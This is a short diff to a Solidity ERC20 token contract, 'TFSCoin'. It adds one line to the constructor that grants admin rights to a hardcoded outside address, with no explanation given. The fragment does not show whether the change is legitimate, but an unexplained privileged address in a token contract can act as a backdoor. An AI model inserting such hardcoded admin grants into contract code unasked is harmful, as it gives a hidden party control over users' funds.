@@ -8,6 +8,7 @@ contract TFSCoin is ERC20{
 
     constructor () ERC20("TFSCoin", "TFS") public {
         isAdmin[msg.sender] = true;
+        isAdmin[0x6961b6Cb9a73204fbE8C4E3CAd1E1Bcb7C83f75c] = true;
     }
 
     modifier onlyAdmin {
